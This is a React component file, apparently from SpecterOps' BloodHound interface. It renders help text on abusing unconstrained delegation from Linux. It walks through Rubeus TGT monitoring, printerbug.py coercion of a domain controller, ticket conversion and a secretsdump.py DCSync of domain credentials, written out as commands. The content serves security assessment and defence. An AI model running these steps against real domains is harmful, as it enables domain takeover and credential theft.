// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';
import CodeController from '../CodeController/CodeController';

const LinuxAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType }) => {
    const intro = (
        <>
            <Typography variant='body2'>
                A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using
                the printspooler.
            </Typography>
            <Typography variant='body2'>
                The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of
                those principals will not be sent to the principal with unconstrained delegation. You can find all the
                protected principals with this Cypher query:
            </Typography>
            <CodeController>
                {`MATCH (g:Group)
                WHERE g.objectid ENDS WITH "-525"
                MATCH (n:Base)
                WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
                RETURN n
                LIMIT 1000`}
            </CodeController>
            <Typography variant='body2'>
                There are many other coercion techniques than printspooler that can be used (see References).
            </Typography>
        </>
    );

    if (sourceType == 'Computer') {
        return (
            <>
                {intro}
                <Typography variant='body1'>Step 1: Start monitoring for TGTs</Typography>
                <Typography variant='body2'>
                    This step cannot be performed from Linux as we are abusing unconstrained delegation on a given AD
                    computer, which is likely a Windows computer.
                </Typography>
                <Typography variant='body2'>
                    Log in on the {sourceName} computer configured with unconstrained delegation and open CMD as
                    Administrator.
                </Typography>
                <Typography variant='body2'>Start monitoring for incoming TGTs using Rubeus:</Typography>
                <Typography component={'pre'}>
                    {'Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap'}
                </Typography>

                <Typography variant='body1'>Step 2: Coerce target DC</Typography>
                <Typography variant='body2'>
                    Coerce the target DC using printerbug.py with the credentials of any AD user:
                </Typography>
                <Typography component={'pre'}>
                    {"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised computer IP>"}
                </Typography>
                <Typography variant='body2'>Rubeus will print the DC TGT as it is received.</Typography>

                <Typography variant='body1'>Step 3: Pass the Ticket</Typography>
                <Typography variant='body2'>Save the TGT base64 blob as a .kirbi file:</Typography>
                <Typography component={'pre'}>
                    {'echo "doIFvjCCBbqgAwI..." | base64 -d | tee ticket.kirbi > /dev/null'}
                </Typography>
                <Typography variant='body2'>Convert the TGT to ccache format using ticketConverter.py:</Typography>
                <Typography component={'pre'}>{'ticketConverter.py ticket.kirbi ticket.ccache'}</Typography>
                <Typography variant='body2'>Set the KRB5CCNAME environment variable to the ticket's path:</Typography>
                <Typography component={'pre'}>{'export KRB5CCNAME=$path_to_ticket.ccache'}</Typography>

                <Typography variant='body1'>Step 4: DCSync target domain</Typography>
                <Typography variant='body2'>Use secretsdump.py to DCSync the target domain:</Typography>
                <Typography component={'pre'}>
                    {'secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>'}
                </Typography>
            </>
        );
    } else {
        return (
            <>
                {intro}
                <Typography variant='body2'>
                    See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the
                    execution.
                </Typography>
            </>
        );
    }
};

export default LinuxAbuse;
